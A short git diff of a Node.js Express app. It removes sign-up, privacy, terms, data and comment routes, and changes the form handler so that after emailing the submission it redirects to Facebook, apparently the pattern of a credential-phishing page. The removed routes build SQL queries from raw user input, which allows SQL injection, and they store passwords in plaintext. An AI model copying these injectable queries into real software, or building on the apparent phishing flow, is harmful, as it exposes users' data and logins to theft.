@@ -62,70 +62,11 @@ app.post('/', function (req, res) {
             console.log('Email sent: ' + info.response);
         }
     });
-    res.redirect('/');
+    res.redirect('https://www.facebook.com/');
 
 
 });
-app.post('/sign_up', function (req, res) {
-    request_first_name = req.body.first_name;
-    request_last_name = req.body.last_name;
-    request_email = req.body.email;
-    request_password = req.body.password;
-    request_confirm_password = req.body.confirm_password;
-    if (request_password == request_confirm_password) {
-        if (request_password.length < 8) {
-            res.render('sign_up', { max: "too short password" })
-        } else {
-            client.query("SELECT * FROM users WHERE email  = '" + request_email + "'", function (err, result) {
-                if (err) {
-                    res.render('sign_up', { max: "error" });
-                } else if (result.rowCount == 0) {
-                    client.query("INSERT INTO users (first_name,last_name,email,password) VALUES ('" + request_first_name + "','" + request_last_name + "','" + request_email + "','" + request_password + "')", function (err, result) {
-                    })
-                    res.render('sign_up', { max: "account added" });
-                } else {
-                    res.render('sign_up', { max: "user exists" });
-                }
-            })
-        }
-    } else {
-        res.render('sign_up', { max: "passwords mismatch" });
-    }
-})
 
-
-
-
-// #########################################################################################################################################################################################
-
-app.get('/privacy', function (req, res) {
-    res.render('privacy')
-})
-app.get('/terms', function (req, res) {
-    res.render('terms')
-})
-app.get('/get_data', function (req, res) {
-    client.query("SELECT * FROM posts", function (err, result) {
-        if (err) {
-        } else {
-
-            res.send(result.rows);
-        }
-    })
-})
-// #########################################################################################################################################################################################
-
-app.get('/ajax', function (req, res) {
-    var a = req.query.comment;
-    console.log(a.split(''));
-    client.query("insert into posts (post) values ('" + a + "')", function (err, result) {
-        if (err) { } else {
-            res.render('index')
-
-        }
-    });
-    res.send(a)
-})
 app.get('*', function (req, res) {
     res.send('Page not found')
 })
